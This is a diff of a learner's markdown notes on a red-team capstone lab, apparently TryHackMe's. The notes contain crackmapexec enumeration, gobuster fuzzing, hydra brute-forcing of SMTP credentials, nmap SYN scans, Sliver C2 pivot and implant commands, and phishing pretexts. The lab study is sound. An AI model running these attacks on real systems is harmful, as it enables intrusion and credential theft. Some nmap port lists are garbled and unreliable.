@@ -37,7 +37,7 @@ General disclaimers,
 - There will be off piste discussion of regarding researching concepts for this
 - There will be my trails and successes
 - This is also exploratory - some very not good Opsec and some much better Opsec
-- Warning the last section contains my and only my opinions of Snowden.   
+- Warning the last section contains mine and only my opinions of Snowden.   
 
 - [[Red-Team-Capstone-Challenge-Notes.md]]
 - [[Red-Team-Capstone-Challenge-CMD-by-CMDs.md]]
@@ -55,7 +55,7 @@ General disclaimers,
 - [Tyler Ramsbey - Youtube](https://www.youtube.com/@TylerRamsbey) / [hack_smarter Twitch](https://www.twitch.tv/hack_smarter) 
 	- Self-Description: *"I post videos on cybersecurity, education, leadership, and all things pertaining to the world of IT!"*
 	- [Full Youtube playlist](https://www.youtube.com/watch?v=xrh3g5VjY6Y&list=PLMoaZm9nyKaOrmj6SQH2b8lP6VN7Z4OD-)
-
+-  [0xb0b writeup](https://0xb0b.gitbook.io/writeups/tryhackme/red-team-capstone-challenge/full-compromise-of-parent-domain) is member of the Work Smarter community ran by Tyler and others.
 
 #### My Map
 
@@ -67,20 +67,22 @@ Firstly connecting to have a pretend domain squated email.
 
 ## OSINT  
 
+
+
 Message from Am03baM4n
 ![](messagefromAmoebaman1.png)
 
-Alh4zr3d initial steps while enumerating in the background begin with `crackmapexec`.
+Alh4zr3d's initial steps while enumerating in the background begin with `crackmapexec`. This contrasts with literature on Pentration testing that suggest portscanning the reason being that it is a Windows Network and will use common ports. This will the save time on identification while some port scanner maps out or not depending on objective regarding stealth. 
 ```
 crackmapexec <proto> 10.200.116.0/24 -u '' -p ''
 ```
 
+We also get versioning for Linux with ssh, not just the Windows hostnames and builds, signing compliance and versions of services. Connecting the dot between clusters of network can hint at what overall design of the network has be shape by what is its expected use.
 ![](cme-init.png)
 
+A common step for CTF players is the Web application, but also APTs. Web application misconfigurations or exploits can exploited and then patched behind the attacker. Webshells then offer easy foothold back into the network if VPN key redistribution or signatures on malicious email and pretexts take time to make and utilize. 
 ![](webroot.png)
-- Aimee Walker & Patrick Edwards.
-
-Harvesting usernames http://10.200.116.13/october/index.php/demo/meettheteam -> linked to http://10.200.116.13/october/themes/demo/assets/images/ 
+- Aimee Walker & Patrick Edwards. Developers with SeDebugPrivilege Rights as Malware Jake says are just SYSTEM (Administrator) they just do not not know it yet. These two individuals did not have pictures helpfully identifying even minor roles on the company. The exposure of minor roles so plainly makes the work to understand the internal relationships of whom communicates with whom very easy. So harvesting usernames from the http://10.200.116.13/october/index.php/demo/meettheteam which links to http://10.200.116.13/october/themes/demo/assets/images/, then all possible include potential employees whom may still have accounts or been misplaced in System Administrator utilizing soft-delete. These account could be revived 
 ```bash
 curl http://10.200.116.13/october/themes/demo/assets/images/ -o images
 cat images| cut -d '"' -f 8 | grep '.jpeg' | sed 's/.jpeg//g' > users.txt
@@ -88,60 +90,65 @@ echo "aimee.walker" >> users.txt
 echo "patrick.edwards" >> users.txt
 ```
 
-I tried injection techniques against the To Do Lists
+I tried injection techniques against the To Do Lists, while various meme-y-antics began on Al's stream regarding the formidable Emily.  
 ![](sendacvtothereserve.png)
 
-Learnt how to configure Thunderbird and a brian nugde  of how DNS is part of resolving MX record - @0xTib3rius 
+I learnt how to configure Thunderbird and a brain-nudge-connecting-connections between how DNS is part of process of resolving MX record - @0xTib3rius 
 ![](thunderbirdconfig.png)
 
-Our first email
+Our first email, very importantly a reminder do no harm to others.
 ![](ourfirstemail.png)
 
-Inital innocuous email - Alh4zr3d went for targeting Lynda because here physical and privileged access to the C-Suite. We change outgoing server
+Initial innocuous email - Alh4zr3d went for targeting Lynda because of physical and privileged access to the C-Suite. We change outgoing server from port 143 to 587
 ![](changedoutgoingserver.png)
 My email sent - remvoed brenda, leslie and martin as they broke the sending process:
 ![](innocuous-email-one.png)
 
-Al gets Charlene almost instantly. It is possible that got filtered due words I have used.
+Al gets Charlene almost instantly. It is possible that mine got filtered due words I have used.
 ![](iaminneedofagoodbank.png)
 
+Apparently the issue of me needing a bank requires someone else as I am need to proof compromise of Swift payment systems could be bad m'kay. 
 ![](charleneresponds.png)
 
 Try to push the mental buttons of panic on the pretend email scripts.
 ![](tryingthepanicbuttons.png)
 
-[Business Unit](https://en.wikipedia.org/wiki/Strategic_business_unit)
+Learning the corperate jargon [Business Unit](https://en.wikipedia.org/wiki/Strategic_business_unit). Proper Unit!
 ![](businessunit.png)
 
-Alh4zr3d wants to pick a domain to impersonate, but typo-squating is not as affective as email services  will alert the user to if the email is an external email.
+Alh4zr3d wants to pick a domain to impersonate, but typo-squating is not as effective in more recent years as he explains that email services will alert the user to if the email is an external email.
 
 Pretext
 1. Reason to reach out to a person
-2. Reason that the target is expecting to recieve emails
+2. Reason that the target is expecting to receive emails
 
+Then vast array of wordlist generators spring to mind. I used to use Mentalist, which I thought was intuitive and simple with tool syntax and seemed fast for a python application, but sadly python3.141592653589793238 is infinite circle of dependency and update hellspawn that it is...maybe mojo will change that, thank nerds for containers and virtual environments and me for not having to develop in python.
 ![](bopscrkused.png)
 
-A funny stream moment I missed because of sleep.
-![](wouldhavebeenfunlive.png)
+A funny stream moment I missed because of sleep. PHP on your IIS webserver, because why not.. [you can](https://learn.microsoft.com/en-us/iis/application-frameworks/scenario-build-a-php-website-on-iis/configure-a-php-website-on-iis) I was sure I did this in AZ104 Tib3rious suggests is rare, which I do not doubt. [Quickstart: Create a PHP web app - Azure App Service](https://learn.microsoft.com/en-us/azure/app-service/quickstart-php)
+![1080](wouldhavebeenfunlive.png)
 
-More recon and trying out password generators later
+More content discovery, because is big on SE-ing-in and Mail Server are more secure than people, but any information helps 
 ```bash
-# 
+# Check for subdomains
 gobuster vhost -u http://thereserve.loc -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -o vhosts.gb
-#
+# Check directories
 gobuster dir -u http://mail.thereserve.loc -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  mail-dirs-raftsmallwords.gb
+```
+
+`mp32` password generators seems like granular compromise for the absolute non-smart massive generator of massive files of words that in a very non-scientific way seem that most of the permutations are not smart permutations when manually viewing. Also the syntax of some others either then would require better granular shifting of symbol and number placement and combined with specific sets combinations at specific points.
+```
 # $WORD from password_base_list
 mp32 --custom-charset1='!@#$%^' $WORD?d?1 >> mp32-passwd.lst
 # Hydra the SMTP server
 hydra -L lists/emails.txt -P mp32-passwd.lst mail.thereserve.loc smtp
 ```
 
-Then credentials 
+Then credentials hit in , the excitement bubbles as the jokes fire off about bad passwords. 
 ![](hydrathepasswords1.png)
+The beginning of the [[Red-Team-Capstone-Challenge-Credentials]] note started.
 
-[[Red-Team-Capstone-Challenge-Credentials]]
-
-Inspired by response time talking point about burpsuite pro - Poor Man's Reponse Curlculator
+Inspired by response time talking point about Burpsuite Pro - Poor Man's Response Curlculator
 ```bash
 #!/bin/bash
 
@@ -181,50 +188,52 @@ echo "Second curl ended at: $TIME3"
 exit
 ```
 
-Just as I was catching up on the progress made by at [Tyler](https://www.youtube.com/watch?v=xrh3g5VjY6Y&t=5277s) this point he discovers a VPN key. Unlike Al or Tibs who went with a target approach - Web server and Email server plus password spray. Tyler went for a similiar approach to I originally set out with holistic scan and enumerate anything and everything and list out threads of where to pull of the next stages of the overall engagement.
+Just as I was catching up on the progress made by at [Tyler](https://www.youtube.com/watch?v=xrh3g5VjY6Y&t=5277s) this point he discovers a VPN key. Unlike Alh4zr3d or Tib3rios who went with a target approach - Web server and Email server plus password spray. Tyler went for a similar approach to I originally set out with holistic scanning and enumerate anything and everything and list out threads of where to pull of the next stages of the overall engagement. 
 
-I guess corperation just like leaving free vpn keys lying around on the vpn gateway..
+A real APT is probably going to sit down and have targets on packet economy, what fake accounts do OSINT from where and so on and target a way in with an objective like ours, but without actual users, administrators or a SOC, CTI or IR. 
+
+I guess corporation just like leaving free VPN keys lying around on the VPN gateway.. apparently this is common..
 ![1080](thefaceofamanwhohasfoundvpnfreetouse.png)
 
-Without having paid much attention just verifying steps made. 
+Without having paid much attention just verifying steps made we have a link to .ovpn file.
 ![1080](vpnkeydirectory.png)
 
-This could also indicate a naming convention for vpn key that we may steal from the employees to by able to securely pivot through the later firewalls. Remember to always read and fix where required
+This could also indicate a naming convention for VPN key that we may steal from the employees to by able to securely pivot through the later firewalls. Remember to always read and fix where required.
 ![](remembertofix.png)
-And fixing it we get a legitmate way in. 
+
+And fixing it we get a legitimate way in. Although we can later create our own VPN key, this key if it existed like this probably would not face issues regarding everyone using it. 
 ![](corpUserinterface.png)
 
 Quick test to figure out username format. 
 ![](usernameformattingdeduction.png)
 
-Given that Tyler does know what `-e` flag for nmap does and I also want to be more red team given there are firewalls and EDRs and all that. Using nmap could be a bad idea. To solve this I checked if `-sS`  would show up as nmap packet that can be parsed as such
+Given that Tyler does not know what `-e` flag for `nmap` does and I also want to be more red team given there are firewalls and EDRs and all that. Using `nmap` could be a bad idea. To solve this I checked if `-sS`  would show up as `nmap` packet that can be parsed as such, but `-sS` is still still a weird set of packets that no application or traffic behaves this way. It would be easy to alert base on receiving multiple from across a range of port over set period of time from enough the `-decoy $ip1, $ip2...` flag with `nmap`. 
 ![](doublechecksshasnonmap.png)
 
-While I was being to overthink the addressing part
+While I was beginning to overthink the addressing part...
 ![](vpninternalnetworksexplained.png)
-It is just in the vpn output. 
-
+It is just in the VPN output. On some output it is the exact correspondence to visual layout displayed on https://tryhackme.com/room/redteamcapstonechallenge page. An excessive example given that `nmap` is on the VPN box. 
 ```bash
-sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,3.116.5000,9.116.-e tun0 172.32.5.21/32
+sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,443,445,464,636,3306,5000 -e tun0 172.32.5.21/32
 
-sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,3.116.5000,9.116.-e tun0 172.32.5.22/32
+sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,443,445,464,636,3306,5000 -e tun0 172.32.5.22/32
 # The alternative would be to try resolve over netbios 
 # 
-sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,3.116.5000 --min-rate 200 -e tun0 12.100.1.0/24 -v
+sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,5000 --min-rate 200 -e tun0 12.100.1.0/24 -v
 
-sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,3.116.5000 --min-rate 200 -e tun0 # -v
-
-
+sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,5000 --min-rate 200 -e tun0 # -v
 ```
 
-A temporary wordlist to the wordlist problem of problems solution for < 38K words. 
+A temporary wordlist to the wordlist problem of problems, solution for < 38K words. 
 ```bash
 cat /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt && cat /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt #&& cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt |  sort -u > betterRaftandDirb.txt
 ```
 
-There is a vpns directory to fuzz. If we have a username format we can fuzz it. I forgot to reset the network and then the vpn key.
+There is a VPNs directory to fuzz. If we have a username format we can fuzz it. I forgot to reset the network and then the VPN key.
 
-Alh4zr3d goes full sliver and re-introduces me to the wonder of [ScareCrow](https://github.com/optiv/ScareCrow) - need to play with this 
+# EDITTED TO HERE
+
+Alh4zr3d goes full sliver and re-introduces me to the wonder of [ScareCrow](https://github.com/optiv/ScareCrow) 
 
 - https://github.com/BishopFox/sliver/wiki/Pivots
 - https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/
@@ -1654,8 +1663,35 @@ And Alice says yes to wiring 10 million dollars
 - Patch the way in theoretically to avoid ToU
 - Add a backdoor to custom source code theoretically to avoid ToU - swift backdoor
 
-- Sliver Pivots to JMP
-- Chisel from VPN to JMP
+- Sliver Pivots VPN to JMP
+- Chisel from  VPN to JMP
+
+Pivots != Portfwd, engress through to implants
+```go
+// List all
+beacons
+// For each required hop 
+use $implant
+interactive
+// For implant that will be the pivot listener  
+use 
+// 
+pivots tcp
+// get details on a specific pivot listener; graph will display the json with more info
+pivots detail | pivot graph
+// generate a implant that will  connect to the pivot listener 
+generate --tcp-pivot 192.168.1.1:9898
+```
+
+```
+generate --tcp-pivot :9898
+```
+
+`portfwd` < `wg-portfwd`
+```
+
+```
+
 
 Preemptive Chisel organisation
 ``` bash
